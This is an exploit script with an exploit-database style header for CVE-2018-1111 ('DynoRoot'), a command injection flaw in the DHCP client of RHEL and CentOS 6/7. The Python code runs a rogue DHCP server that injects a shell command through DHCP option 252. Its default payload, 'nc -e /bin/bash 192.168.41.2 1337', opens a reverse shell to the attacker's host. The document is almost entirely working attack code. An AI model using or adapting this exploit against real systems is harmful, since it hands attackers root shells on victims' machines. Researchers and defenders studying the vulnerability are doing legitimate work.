# Exploit Title: DynoRoot DHCP - Client Command Injection
# Date: 2018-05-18
# Exploit Author: Kevin Kirsche
# Exploit Repository: https://github.com/kkirsche/CVE-2018-1111
# Exploit Discoverer: Felix Wilhelm
# Vendor Homepage: https://www.redhat.com/
# Version: RHEL 6.x / 7.x and CentOS 6.x/7.x
# Tested on: CentOS Linux release 7.4.1708 (Core)  / NetworkManager 1.8.0-11.el7_4
# CVE : CVE-2018-1111

#!/usr/bin/env python

from argparse import ArgumentParser
from scapy.all import BOOTP_am, DHCP
from scapy.base_classes import Net


class DynoRoot(BOOTP_am):
    function_name = "dhcpd"

    def make_reply(self, req):
        resp = BOOTP_am.make_reply(self, req)
        if DHCP in req:
            dhcp_options = [(op[0], {1: 2, 3: 5}.get(op[1], op[1]))
                            for op in req[DHCP].options
                            if isinstance(op, tuple) and op[0] == "message-type"]
            dhcp_options += [("server_id", self.gw),
                             ("domain", self.domain),
                             ("router", self.gw),
                             ("name_server", self.gw),
                             ("broadcast_address", self.broadcast),
                             ("subnet_mask", self.netmask),
                             ("renewal_time", self.renewal_time),
                             ("lease_time", self.lease_time),
                             (252, "x'&{payload} #".format(payload=self.payload)),
                             "end"
                             ]
            resp /= DHCP(options=dhcp_options)
        return resp


if __name__ == '__main__':
    parser = ArgumentParser(description='CVE-2018-1111 DynoRoot exploit')

    parser.add_argument('-i', '--interface', default='eth0', type=str,
                        dest='interface',
                        help='The interface to listen for DHCP requests on (default: eth0)')
    parser.add_argument('-s', '--subnet', default='192.168.41.0/24', type=str,
                        dest='subnet', help='The network to assign via DHCP (default: 192.168.41.0/24)')
    parser.add_argument('-g', '--gateway', default='192.168.41.254', type=str,
                        dest='gateway', help='The network gateway to respond with (default: 192.168.41.254)')
    parser.add_argument('-d', '--domain', default='victim.net', type=str,
                        dest='domain', help='Domain to assign (default: victim.net)')
    parser.add_argument('-p', '--payload', default='nc -e /bin/bash 192.168.41.2 1337', type=str,
                        dest='payload', help='The payload / command to inject (default: nc -e /bin/bash 192.168.41.2 1337)')

    args = parser.parse_args()
    server = DynoRoot(iface=args.interface, domain=args.domain,
                      pool=Net(args.subnet),
                      network=args.subnet,
                      gw=args.gateway,
                      renewal_time=600, lease_time=3600)
    server.payload = args.payload

    server()